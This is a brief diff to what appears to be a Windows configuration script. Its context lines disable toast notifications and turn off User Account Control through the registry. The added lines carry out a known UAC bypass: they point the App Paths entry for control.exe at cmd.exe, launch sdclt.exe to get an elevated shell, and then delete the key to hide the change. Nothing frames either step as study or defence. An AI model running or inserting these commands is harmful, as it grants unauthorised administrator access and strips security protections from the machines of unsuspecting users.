@@ -11,3 +11,6 @@ Set-ItemProperty -Path $path -Name "NoToastApplicationNotification" -Value 1 -Ty
 
 # Disable UAC without immediate restart
 Start-Process "reg.exe" -ArgumentList 'ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f' -NoNewWindow -Wait
+
+-----------------------
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f && START /W sdclt.exe && reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
